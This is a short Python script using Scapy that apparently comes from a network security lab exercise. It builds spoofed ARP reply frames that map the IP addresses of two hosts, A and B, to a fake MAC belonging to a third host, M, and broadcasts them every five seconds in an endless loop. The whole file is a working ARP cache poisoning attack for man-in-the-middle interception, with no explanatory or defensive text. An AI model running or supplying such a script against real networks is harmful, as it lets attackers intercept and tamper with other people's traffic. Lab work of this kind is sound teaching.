#!/usr/bin/env python3
from scapy.all import *
import time

IP_V       = "10.9.0.5"             #host A
IP_T       = "10.9.0.6"             #host B
MAC_T_fake = "02:42:0a:09:00:69"    #host M

# To host A
ether3  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp3    = ARP(psrc  = IP_T, hwsrc = MAC_T_fake, pdst  = IP_T, hwdst = "ff:ff:ff:ff:ff:ff")
arp3.op = 2   # Reply
frame3 = ether3/arp3

# To host B
ether3_2  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp3_2    = ARP(psrc  = IP_V, hwsrc = MAC_T_fake, pdst  = IP_V, hwdst = "ff:ff:ff:ff:ff:ff")
arp3_2.op = 2   # Reply
frame3_2 = ether3_2/arp3_2

# Send out the Spoofed ARP packet every 5 sec
while True:
    sendp(frame3)
    print("Send frame3")
    sendp(frame3_2)
    print("Send frame3_2")
    time.sleep(5)
